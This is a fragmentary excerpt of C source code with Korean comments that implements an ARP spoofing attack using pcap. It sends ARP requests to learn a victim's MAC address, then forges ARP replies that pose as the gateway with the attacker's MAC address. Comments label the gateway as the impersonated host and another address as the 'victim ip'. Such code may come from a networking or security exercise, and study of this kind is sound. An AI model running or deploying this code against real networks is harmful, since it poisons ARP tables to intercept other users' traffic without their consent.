...
MAC sender_mac;// { 0xcc, 0x2f, 0x71, 0x59, 0x64, 0x74 };	//공격을 위해서는 공격자의 mac주소가 들어가야함. type은 reply
IP sender_ip;// { 192, 168, 43, 1 };//{ 192, 168, 43, 97 };	//공격하려면 gateway ip주소가 들어가야 함.
MAC destination_mac;// = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };		//테이블 변조 대상
...
int sendARPrequest(pcap_t* fp, IP* target, IP* sender) {
	...
	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
		...
		eth.dest[i] = 0xff;
		arp.send_mac[i] = sender_mac.mac[i];	//target mac는 gateway인척 pretending하는 mac주소로, attacker의 mac이다.
		arp.recv_mac[i] = 0x00;
	}
	...
	for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
		arp.send_ip[i] = sender_ip.ip[i];		//actual my ip, 대충써도 된다더라
...
int arp_getmac(pcap_t* fp, IP* target_ip, MAC* mac_container, IP* sender_ip) {
	...
	if (sendARPrequest(fp, target_ip, sender_ip) == -1)										//mac을 따기 위해 거짓 패킷을 하나 보냄
		return -1;
	...
	while (temp) {
		...
		if (temp[12] == 0x08 && temp[13] == 0x06) {											//ARP패킷인지 확인
			if (!memcmp((const char*)target_ip->ip, (const char*)temp + 28, IPV4_LEN)) {	//28 ~ 31이 target ip와 같은지
...
int sendPacket(pcap_t* fp, int type) {
	...
	if (type == ARP_REPLY_TYPE) {							//when arp
		...
		for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
			arp.send_ip[i] = sender_ip.ip[i];		//arp에선 source ip가 pretending ip(gateway)이다.
			arp.recv_ip[i] = destination_ip.ip[i];	//victim ip
		}
...
//INPUT---------------------------------------------------------------------------------------------------------------------
	...
	sender_mac = my_mac;								//여기서 sender_mac은 내 것으로 변조

	if (arp_getmac(fp, &destination_ip, &destination_mac, &sender_ip) == -1)		//destination_mac 구하기
